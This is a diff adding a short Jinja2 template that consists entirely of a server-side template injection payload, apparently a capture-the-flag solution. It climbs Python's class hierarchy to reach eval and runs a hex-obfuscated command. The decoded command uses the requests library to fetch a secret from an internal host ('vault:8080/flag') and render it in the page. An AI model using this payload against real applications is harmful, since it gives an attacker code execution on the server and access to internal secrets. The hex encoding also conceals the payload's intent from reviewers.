@@ -1,0 +1,6 @@
+{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %}
+{% for b in c.__init__.func_globals.values() %} {% if b.__class__ == {}.__class__ %}
+{% if 'eval' in b.keys() %}
+{{ b['eval']('5f5f696d706f72745f5f2822726571756573747322292e6765742822687474703a2f2f7661756c743a383038302f666c616722292e74657874'.decode('hex')) }}
+{% endif %} {% endif %} {% endfor %}
+{% endif %} {% endfor %}
